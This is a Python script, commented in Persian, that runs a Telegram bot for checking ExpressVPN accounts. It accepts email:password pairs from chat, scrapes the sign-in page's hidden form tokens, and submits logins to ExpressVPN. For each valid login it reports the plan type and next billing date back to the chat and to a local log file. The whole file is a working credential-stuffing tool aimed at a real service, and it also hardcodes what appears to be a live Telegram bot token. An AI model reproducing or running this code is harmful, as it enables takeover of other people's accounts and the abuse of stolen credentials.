import requests
import re
import urllib.parse
import time
from datetime import datetime

# تنظیمات اولیه
BOT_TOKEN = "8406422111:AAE-DT7FSz9W1e2VHEZSZwVRnIQ69GhQUEs"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
LOG_FILE = "expressvpn_logs.txt"

# هدرهای درخواست HTTP
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

def log_result(message):
    """ذخیره پیام در فایل لاگ"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")

def send_telegram_message(chat_id, message):
    """ارسال پیام به تلگرام با استفاده از API"""
    url = f"{BASE_URL}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote(message)}"
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        if response.status_code != 200:
            log_result(f"خطا در ارسال پیام به چت {chat_id}: کد وضعیت {response.status_code}")
    except Exception as e:
        log_result(f"خطا در ارسال پیام به چت {chat_id}: {str(e)}")

def get_updates(offset=None):
    """دریافت به‌روزرسانی‌ها از تلگرام"""
    params = {'offset': offset, 'timeout': 30} if offset else {'timeout': 30}
    url = f"{BASE_URL}/getUpdates"
    try:
        response = requests.get(url, params=params, headers=HEADERS, timeout=30)
        if response.status_code == 200:
            return response.json()
        else:
            log_result(f"خطا در دریافت به‌روزرسانی‌ها: کد وضعیت {response.status_code}")
            return None
    except Exception as e:
        log_result(f"خطا در دریافت به‌روزرسانی‌ها: {str(e)}")
        return None

def parse_lr(source, left, right):
    """استخراج متن بین دو رشته"""
    pattern = f"{re.escape(left)}(.*?){re.escape(right)}"
    match = re.search(pattern, source, re.DOTALL)
    return match.group(1) if match else ""

def check_expressvpn(email, password, chat_id):
    """بررسی حساب ExpressVPN و ارسال نتیجه به تلگرام"""
    log_result(f"شروع بررسی برای {email} از چت {chat_id}")
    try:
        # درخواست GET به صفحه ورود
        response = requests.get("https://www.expressvpn.com/sign-in", headers=HEADERS, timeout=10)
        if response.status_code != 200:
            send_telegram_message(chat_id, f"خطا: دسترسی به صفحه ورود ناموفق (وضعیت: {response.status_code})")
            return

        source = response.text
        ss = parse_lr(source, 'xkgztqpe\\" value=\\"', '\\"')
        if not ss:
            send_telegram_message(chat_id, "خطا: نتوانست توکن xkgztqpe را استخراج کند")
            log_result(f"نتوانست توکن xkgztqpe را برای {email} استخراج کند")
            return

        s = urllib.parse.quote(ss)
        a = parse_lr(source, "<input name='", "<input id='redirect_path'")
        if not a:
            send_telegram_message(chat_id, "خطا: نتوانست نام ورودی redirect_path را استخراج کند")
            log_result(f"نتوانست نام ورودی redirect_path را برای {email} استخراج کند")
            return

        b = a.replace("type='hidden'>", "").replace("'", "").replace(" ", "")
        b = parse_lr(b, "", "'")
        b = urllib.parse.quote(b)
        user = urllib.parse.quote(email)
        password = password

        # درخواست POST برای ورود
        post_data = f"utf8=%E2%9C%93&xkgztqpe={s}&location_fragment=&{b}=&redirect_path=&email={user}&password={password}&commit=Sign+In"
        response = requests.post("https://www.expressvpn.com/sessions", data=post_data, headers=HEADERS, timeout=10)

        response_text = response.text.lower()
        if "invalid email or password" in response_text:
            send_telegram_message(chat_id, f"شکست: ایمیل یا رمز عبور نامعتبر برای {email}")
            log_result(f"شکست: ایمیل یا رمز عبور نامعتبر برای {email}")
        elif "verify" in response_text or "verification" in response_text:
            send_telegram_message(chat_id, f"موفقیت: ورود برای {email} موفق بود")
            log_result(f"موفقیت: ورود برای {email} موفق بود")

            # بررسی اشتراک
            account_response = requests.get("https://www.expressvpn.com/account", headers=HEADERS, timeout=10)
            if account_response.status_code == 200:
                account_source = account_response.text
                plan_match = parse_lr(account_source, 'Plan Type:</strong>', '</div>')
                expiry_match = parse_lr(account_source, 'Next Billing Date:</strong>', '</div>')
                plan = plan_match.strip() if plan_match else "نامشخص"
                expiry = expiry_match.strip() if expiry_match else "نامشخص"
                subscription_info = f"طرح اشتراک: {plan}\nتاریخ بعدی صورت‌حساب: {expiry}"
                send_telegram_message(chat_id, f"جزئیات اشتراک برای {email}:\n{subscription_info}")
                log_result(f"اشتراک برای {email}: طرح={plan}, انقضا={expiry}")
            else:
                send_telegram_message(chat_id, "خطا: نتوانست جزئیات اشتراک را دریافت کند")
                log_result(f"نتوانست جزئیات اشتراک را برای {email} دریافت کند (وضعیت: {account_response.status_code})")
        else:
            send_telegram_message(chat_id, "پاسخ ناشناخته از سرور")
            log_result(f"پاسخ ناشناخته برای {email}")

    except requests.RequestException as e:
        send_telegram_message(chat_id, f"خطا: مشکل شبکه - {str(e)}")
        log_result(f"خطای شبکه برای {email}: {str(e)}")
    except Exception as e:
        send_telegram_message(chat_id, f"خطا: مشکل غیرمنتظره - {str(e)}")
        log_result(f"خطای غیرمنتظره برای {email}: {str(e)}")

def main():
    """اجرای اصلی برنامه"""
    log_result("شروع ربات...")
    last_update_id = None
    while True:
        updates = get_updates(last_update_id)
        if updates and updates.get('ok'):
            for update in updates['result']:
                last_update_id = update['update_id'] + 1
                chat_id = update['message']['chat']['id']
                text = update['message']['text'].strip()

                if text == '/start':
                    send_telegram_message(chat_id, "خوش آمدید! ایمیل:رمزعبور را به این فرمت ارسال کنید (مثال: test@example.com:password123).")
                elif ':' in text:
                    email, password = text.split(':', 1)
                    send_telegram_message(chat_id, f"در حال بررسی {email}...")
                    check_expressvpn(email, password, chat_id)
                else:
                    send_telegram_message(chat_id, "فرمت اشتباه! لطفاً به صورت ایمیل:رمزعبور ارسال کنید (مثال: test@example.com:password123).")
        time.sleep(1)  # تأخیر ۱ ثانیه‌ای برای جلوگیری از بار اضافی

if __name__ == "__main__":
    main()